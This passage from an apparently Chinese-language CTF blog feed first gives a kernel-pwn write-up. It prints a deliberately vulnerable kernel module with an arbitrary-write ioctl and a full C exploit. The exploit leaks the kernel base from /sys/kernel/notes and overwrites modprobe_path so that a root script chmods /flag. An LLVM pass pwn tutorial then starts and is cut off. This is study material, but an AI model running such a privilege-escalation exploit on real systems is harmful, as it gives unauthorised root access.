class="string">&quot;linux/printk.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/miscdevice.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;veritas&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">vuln_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">uint64_t</span> addr;</span><br><span class="line">        <span class="type">uint64_t</span> val;</span><br><span class="line">    &#125; u;</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;u, (<span class="type">void</span> *)arg, <span class="keyword">sizeof</span>(u))) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// write anything anywhere</span></span><br><span class="line">    <span class="comment">// pr_err(&quot;Arb Write [0x%016llx] = 0x%016llx\n&quot;, u.addr, u.val);</span></span><br><span class="line">    *(<span class="type">uint64_t</span> *)(u.addr) = u.val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">vuln_fops</span> =</span> &#123;.owner = THIS_MODULE,</span><br><span class="line">                                           .open = <span class="literal">NULL</span>,</span><br><span class="line">                                           .release = <span class="literal">NULL</span>,</span><br><span class="line">                                           .read = <span class="literal">NULL</span>,</span><br><span class="line">                                           .write = <span class="literal">NULL</span>,</span><br><span class="line">                                           .unlocked_ioctl = vuln_ioctl&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span> <span class="title">vuln_miscdev</span> =</span> &#123;</span><br><span class="line">    .minor = MISC_DYNAMIC_MINOR, .name = <span class="string">&quot;vuln&quot;</span>, .fops = &amp;vuln_fops&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">vuln_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    pr_info(<span class="string">&quot;vuln: module init.\n&quot;</span>);</span><br><span class="line">    misc_register(&amp;vuln_miscdev);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">vuln_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    pr_info(<span class="string">&quot;vuln: module exit.\n&quot;</span>);</span><br><span class="line">    misc_deregister(&amp;vuln_miscdev);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(vuln_init);</span><br><span class="line">module_exit(vuln_exit);</span><br></pre></td></tr></table></figure><p>可以看到我们有无数次任意地址写 <code>8</code> 字节的机会，假设上面泄露出来的地址是正确的，我们可以通过修改 <code>modprobe_path</code> 来获取 <code>flag</code><br>exp：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> modprobe_path = <span class="number">0xffffffff82e8b920</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="type">size_t</span> vul;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">vuln</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">void</span> <span class="title function_">arb_write</span><span class="params">(<span class="type">size_t</span> addr, <span class="type">size_t</span> vul)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">thisNote</span>;</span></span><br><span class="line">    thisNote.addr = addr;</span><br><span class="line">    thisNote.vul = vul;</span><br><span class="line">    ioctl(fd, <span class="number">0</span>, &amp;thisNote);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** env)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> leak, kernel_base;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/vuln&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> note_fd = open(<span class="string">&quot;/sys/kernel/notes&quot;</span>, O_RDONLY);</span><br><span class="line">    read(note_fd, data, <span class="number">0x100</span>);</span><br><span class="line">    binary_dump(<span class="string">&quot;/sys/kernel/notes&quot;</span>, data, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;leak, &amp;data[<span class="number">0x84</span>], <span class="number">8</span>);</span><br><span class="line">    hexx(<span class="string">&quot;leak&quot;</span>, leak);</span><br><span class="line">    kernel_base = leak - <span class="number">0x22961c0</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_base&quot;</span>, kernel_base);</span><br><span class="line">    <span class="type">size_t</span> kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_offset&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    modprobe_path += kernel_offset;</span><br><span class="line"></span><br><span class="line">    arb_write(modprobe_path, <span class="number">0x7465672f706d742f</span>);</span><br><span class="line">    arb_write(modprobe_path + <span class="number">8</span>, <span class="number">0x6c6c656873</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;# make fake file magic not found&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh\nchmod 777 /flag&#x27;&gt;/tmp/getshell&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/getshell&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27;&gt;/tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/tmp/fake&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;# get flag&quot;</span>);</span><br><span class="line">    <span class="type">int</span> flag_fd = open(<span class="string">&quot;/flag&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (flag_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open flag failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    read(flag_fd, data, <span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] flag is %s\n&quot;</span>,data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下：  </p><img src="/2024/04/17/notes/2.png" class="" title="我的图图呢">  <p>显然泄露出来的内核地址是可用的。通过调试发现泄露出来的是 <code>startup_xen</code> 的地址  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_XEN_PV</span></span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_VIRT_BASE,      _ASM_PTR __START_KERNEL_map)</span><br><span class="line"><span class="comment">/* Map the p2m table to a 512GB-aligned user address. */</span></span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_INIT_P2M,       .quad (PUD_SIZE * PTRS_PER_PUD))</span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_ENTRY,          _ASM_PTR startup_xen)</span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_FEATURES,       .ascii <span class="string">&quot;!writable_page_tables&quot;</span>)</span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_PAE_MODE,       .asciz <span class="string">&quot;yes&quot;</span>)</span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_L1_MFN_VALID,</span><br><span class="line">.quad _PAGE_PRESENT; .quad _PAGE_PRESENT)</span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_MOD_START_PFN,  .<span class="type">long</span> <span class="number">1</span>)</span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_PADDR_OFFSET,   _ASM_PTR <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>然而 <code>Cook</code> 发布了 <code>leaking_addresses.pl</code> 的补丁。它可以读取内核符号文件（例如 <code>/proc/kallsyms</code> ），并查看与这些符号关联的地址是否出现在 <code>/sys/kernel/notes</code> 这样的二进制文件中。有了此更改之后， <code>leaking_addresses.pl</code> 就会发现这种长期存在的内核地址泄露，但我感觉还是会有漏网之鱼（笑  </p><p>reference：<br><a href="https://lore.kernel.org/all/202402180028.6DB512C50@keescook/">https://lore.kernel.org/all/202402180028.6DB512C50@keescook/</a><br><a href="https://lwn.net/Articles/962782/">https://lwn.net/Articles/962782/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>llvm pass pwn</title>
      <link href="/2024/03/15/llvm/"/>
      <url>/2024/03/15/llvm/</url>
      
        <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>既然说到<code>llvm pass pwn</code>，我们肯定要先了解<code>llvm</code>到底是一个什么东西<br>学过编译原理的人应该都知道，编译过程主要可以划分为前端与后端：  </p><ul><li>前端把源代码翻译成中间表示 (<code>IR</code>)</li><li>后端把IR编译成目标平台的机器码。当然，<code>IR</code>也可以给解释器解释执行</li></ul><p>然而，经典的编译器如<code>gcc</code>在设计上都是提供一条龙服务的： 你不需要知道它使用的<code>IR</code>是什么样的，它也不会暴露中间接口来给你操作它的<code>IR</code>。 换句话说，从前端到后端，这些编译器的大量代码都是强耦合的。  </p><p>这样做有好处也有坏处。好处是，因为不需要暴露中间过程的接口，它可以在内部做任何想做的平台相关的优化。 而坏处是，每当一个新的平台出现，这些编译器都要各自为政实现一个从自己的<code>IR</code>到新平台的后端。 甚至如果当一种新语言出现，且需要实现一个新的编译器，那么可能需要设计一个新的<code>IR</code>，以及针对大部分平台实现这个<code>IR</code>的后端。 不妨想一下，如果有M种语言、<code>N</code>种目标平台，那么最坏情况下要实现 <code>M*N</code> 个前后端。这是很低效的。  </p><p>因此，我们很自然地会想，如果大家都共用一种<code>IR</code>呢？ 那么每当新增加一种语言，我们就只要添加一个这个语言到<code>IR</code>的前端； 每当新增加一种目标平台，我们就只要添加一个<code>IR</code>到这个目标平台的后端。 如果有M种语言、N种目标平台，那么最优情况下我们只要实现 <code>M+N</code> 个前后端。  </p><p>而<code>LLVM</code>就是这样一个项目。<code>LLVM</code>的核心设计了一个叫 <code>LLVM IR</code> 的中间表示， 并以库(<code>Library</code>) 的方式提供一系列接口， 为你提供诸如操作<code>IR</code>、生成目标平台代码等等后端的功能。  </p><p>那么 <code>LLVM Pass</code> 又是什么呢？ <code>Pass</code>就是“遍历一遍<code>IR</code>，可以同时对它做一些操作”的意思。翻译成中文应该叫“趟”。 在实现上，<code>LLVM</code>的核心库中会给你一些 <code>Pass</code>类 去继承。你需要实现它的一些方法。 最后使用<code>LLVM</code>的编译器会把它翻译得到的<code>IR</code>传入<code>Pass</code>里，给你遍历和修改。  </p><p>下面列出几个比较重要的命令行工具：  </p><ul><li><code>llvm-as</code>：把<code>LLVM IR</code>从人类能看懂的文本格式汇编成二进制格式。注意：此处得到的不是目标平台的机器码。</li><li><code>llvm-dis</code>：<code>llvm-as</code>的逆过程，即反汇编。 不过这里的反汇编的对象是<code>LLVM IR</code>的二进制格式，而不是机器码。</li><li><code>opt</code>：优化<code>LLVM IR</code>。输出新的<code>LLVM IR</code>。</li><li><code>llc</code>：把<code>LLVM IR</code>编译成汇编码。需要用<code>as</code>进一步得到机器码。</li><li><code>lli</code>：解释执行<code>LLVM IR</code>。</li></ul><p>下面简单聊聊<code>llvm IR</code>  </p><h2 id="何为LLVM-IR"><a href="#何为LLVM-IR" class="headerlink" title="何为LLVM IR"></a>何为LLVM IR</h2><ul><li><code>LVM IR</code> 是一门低级编程语言，语法类似于汇编</li><li>任何高级编程语言（如<code>C++</code>）都可以用 <code>LLVM IR</code> 表示</li><li>基于 <code>LLVM IR</code> 可以很方便地进行代码优化(任何编程语言都能统一转换为<code>LLVM IR</code>)</li></ul><img src="/2024/03/15/llvm/1.png" class="" title="我的图图呢">  <h2 id="LLVM-IR的两种表示方法"><a href="#LLVM-IR的两种表示方法" class="headerlink" title="LLVM IR的两种表示方法"></a>LLVM IR的两种表示方法</h2><ul><li>人类可以阅读的文本形式，文件后缀为 <code>.ll</code></li><li>易于机器处理的二进制格式，文件后缀为 <code>.bc</code></li></ul><p>下面给出一些常用的指令：  </p><ul><li>.c -&gt; .ll：clang -emit-llvm -S exp.c -o exp.ll</li><li>.c -&gt; .bc: clang -emit-llvm -c exp.c -o exp.bc</li><li>.ll -&gt; .bc: llvm-as a.ll -o exp.bc</li><li>.bc -&gt; .ll: llvm-dis a.bc -o exp.ll</li><li>.bc -&gt; .s: llc exp.bc -o exp.s</li></ul><p>下面来分析官方文档中一个入门级别的<code>llvm pass</code>程序：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Hello</span> : <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">        <span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line">        <span class="built_in">Hello</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123; <span class="comment">// 重写runOnFunction，使得每遍历到一个函数时就输出函数名</span></span><br><span class="line">            <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">            <span class="built_in">errs</span>().<span class="built_in">write_escaped</span>(F.<span class="built_in">getName</span>()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;; <span class="comment">// end of struct Hello</span></span><br><span class="line">&#125;  <span class="comment">// end of anonymous namespace</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> Hello::ID = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>, <span class="comment">// 使用 RegisterPass 宏注册 Hello Pass。这允许它通过命令行参数传递给LLVM工具</span></span></span></span><br><span class="line"><span class="params"><span class="function">                             <span class="literal">false</span> <span class="comment">/* Only looks at CFG */</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                             <span class="literal">false</span> <span class="comment">/* Analysis Pass */</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>这段代码的主要内容是注册了一个<code>Hello</code>函数，重写了<code>runOnFunction</code>函数，使得每遍历到一个函数时就输出函数名。  </p><p>一般来说，在<code>pwn</code>题中，漏洞主要来自于<code>so</code>文件中，而漏洞多产生于重写了<code>so</code>文件中的<code>runOnFunction</code>函数，我们可以通过在<code>ida</code>中搜索<code>vtable</code>来定位这一个函数，而我们要攻击的则是<code>opt</code>这个<code>elf</code>文件<br>至于<code>PASS</code>注册的名称，一般会在<code>README</code>文件中给出，若是没有给出，可通过对<code>__cxa_atexit</code>函数“交叉引用”来定位  </p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载常见的<code>clang</code>和<code>llvm</code>版本  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install clang-8</span><br><span class="line">sudo apt install llvm-8</span><br><span class="line"> </span><br><span class="line">sudo apt install clang-10</span><br><span class="line">sudo apt install llvm-10</span><br><span class="line"> </span><br><span class="line">sudo apt install clang-12</span><br><span class="line">sudo 